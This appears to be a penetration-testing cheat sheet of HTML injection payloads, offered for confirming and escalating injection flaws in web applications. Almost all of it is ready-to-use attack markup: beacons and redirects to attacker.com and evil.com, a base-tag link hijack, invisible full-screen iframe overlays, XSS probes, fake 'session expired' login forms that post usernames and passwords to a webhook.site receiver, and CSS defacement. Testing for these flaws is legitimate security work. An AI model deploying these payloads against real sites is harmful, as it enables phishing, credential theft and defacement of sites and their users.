# Basic HTML Injection Payloads

Use these to **confirm** HTML injection is possible before escalating.

---

## Confirmation Payloads

```html
<b>test</b>
<i>test</i>
<u>test</u>
<h1>test</h1>
<h2>test</h2>
<s>test</s>
<marquee>test</marquee>
<blink>test</blink>
<big>test</big>
<small>test</small>
```

**What to look for:** If any of these render visually (bold, italic, large text), injection is confirmed.

---

## Image Payloads

```html
<!-- Basic image load -->
<img src="https://attacker.com/image.png">

<!-- Broken src to trigger onerror (XSS escalation attempt) -->
<img src=x onerror=alert(1)>

<!-- Out-of-band detection via Burp Collaborator -->
<img src="https://YOUR-COLLABORATOR-URL.oastify.com/test">

<!-- 1x1 invisible tracking pixel -->
<img src="https://attacker.com/track" width=1 height=1>
```

---

## Link & Redirect Payloads

```html
<!-- Clickable phishing link -->
<a href="https://evil.com">Click here to verify your account</a>

<!-- Auto redirect (0 second delay) -->
<meta http-equiv="refresh" content="0;url=https://evil.com">

<!-- Redirect after 3 seconds -->
<meta http-equiv="refresh" content="3;url=https://evil.com">

<!-- Base tag hijack — redirects ALL relative links on page -->
<base href="https://evil.com/">
```

> **Note:** The `<base>` tag is especially powerful. One injection point can hijack every relative link on the entire page.

---

## Iframe Payloads

```html
<!-- Embed external site -->
<iframe src="https://evil.com" width="500" height="400"></iframe>

<!-- Fullscreen invisible overlay -->
<iframe src="https://evil.com" style="position:fixed;top:0;left:0;width:100%;height:100%;border:none;z-index:9999"></iframe>

<!-- srcdoc (inline HTML, no external request) -->
<iframe srcdoc="<h1>Injected</h1>" sandbox></iframe>
```

---

## Fake Login Form (Highest Impact)

Use [webhook.site](https://webhook.site) to generate a free receiver URL for PoC.

```html
<form action="https://webhook.site/YOUR-UNIQUE-ID" method="POST">
  <p><b>Your session has expired. Please login again.</b></p>
  <input type="text" name="username" placeholder="Username"><br><br>
  <input type="password" name="password" placeholder="Password"><br><br>
  <input type="submit" value="Login">
</form>
```

**Styled version for stronger PoC:**
```html
<div style="background:#fff;padding:30px;border:1px solid #ddd;width:320px;font-family:Arial;border-radius:8px">
  <h3 style="color:#333;margin-bottom:20px">Session Expired</h3>
  <p style="color:#666;font-size:13px">Please verify your identity to continue.</p><br>
  <form action="https://webhook.site/YOUR-UNIQUE-ID" method="POST">
    <input type="email" name="email" placeholder="Email Address" style="width:100%;padding:10px;margin-bottom:10px;border:1px solid #ddd;border-radius:4px;box-sizing:border-box"><br>
    <input type="password" name="password" placeholder="Password" style="width:100%;padding:10px;margin-bottom:15px;border:1px solid #ddd;border-radius:4px;box-sizing:border-box"><br>
    <button type="submit" style="width:100%;padding:10px;background:#0066cc;color:white;border:none;border-radius:4px;cursor:pointer;font-size:15px">Verify Identity</button>
  </form>
</div>
```

---

## SVG Payloads

```html
<!-- Basic SVG text injection -->
<svg><text x="10" y="30" font-size="20">Injected via SVG</text></svg>

<!-- SVG onload (XSS escalation attempt) -->
<svg onload=alert(1)>

<!-- SVG with embedded form -->
<svg><foreignObject width="500" height="300">
  <body xmlns="http://www.w3.org/1999/xhtml">
    <form action="https://webhook.site/YOUR-ID" method="POST">
      <input type="password" placeholder="Password">
      <input type="submit" value="Login">
    </form>
  </body>
</foreignObject></svg>
```

---

## CSS Injection via Style Tags

```html
<!-- Page defacement -->
<style>
body::before {
  content: "This site has been hacked";
  font-size: 48px;
  color: red;
  position: fixed;
  top: 50%;
  left: 50%;
  transform: translate(-50%, -50%);
  z-index: 9999;
  background: white;
  padding: 20px;
}
</style>

<!-- Hide existing page content -->
<style>body { display: none }</style>

<!-- Hide specific element -->
<style>#real-login-form { display: none }</style>
```
